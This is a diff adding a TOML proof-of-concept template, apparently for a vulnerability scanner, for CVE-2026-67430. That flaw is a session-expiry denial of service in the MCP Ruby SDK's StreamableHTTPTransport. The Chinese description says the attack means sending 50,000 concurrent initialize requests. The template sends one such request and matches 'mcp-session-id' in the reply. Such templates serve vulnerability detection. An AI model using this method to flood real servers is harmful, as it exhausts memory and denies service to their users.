@@ -1,0 +1,40 @@
+[info]
+author = "AVE"
+description = "通过向 MCP Ruby SDK StreamableHTTPTransport 发送大量 JSON-RPC initialize 请求，验证服务器会话未过期导致内存耗尽拒绝服务漏洞。发送 50000 个并发 initialize 请求后，服务器内存从 45MB 增长至 152MB 且会话数永久保持 50000 不释放。"
+id = "POC-AVE-2026-0958"
+name = "CVE-2026-67430 PoC"
+severity = "medium"
+tags = [
+    "cve-2026-67430",
+    "mcp",
+    "ruby-sdk",
+    "dos",
+    "memory-exhaustion",
+]
+vuln_id = [
+    "CVE-2026-67430",
+    "AVE-2026-0958",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-11-25","capabilities":{},"clientInfo":{"name":"flooder","version":"1.0"}}}'
+type = "raw"
+
+[poc.requests.headers]
+Accept = "application/json, text/event-stream"
+Connection = "close"
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["mcp-session-id"]
